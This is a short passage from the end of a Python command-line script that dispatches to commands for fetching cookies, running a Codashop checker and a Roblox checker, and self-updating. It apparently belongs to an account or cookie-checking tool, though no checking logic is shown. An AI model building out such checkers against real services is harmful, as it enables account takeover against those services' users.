    elif args.command == "fetchcookies":
        download_fresh_cookies()
    elif args.command == "codashop":
        run_codashop_checker()
    elif args.command == "roblox":
        rblx = RobloxChecker()
        rblx.run()
    elif args.command == "update":
        self_update(restart=True)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.warning("Interrupted by user")
        sys.exit(1)
